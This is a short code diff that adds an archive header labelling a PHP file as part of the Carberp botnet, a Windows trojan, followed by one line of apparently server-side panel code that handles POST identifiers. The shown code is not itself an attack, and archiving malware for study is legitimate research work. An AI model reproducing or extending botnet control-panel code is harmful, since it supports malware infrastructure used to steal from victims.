@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 if(empty($_POST['prefix']) && empty($_POST['id']) && !empty($_POST['uid'])) $_POST['id'] = $_POST['uid'];
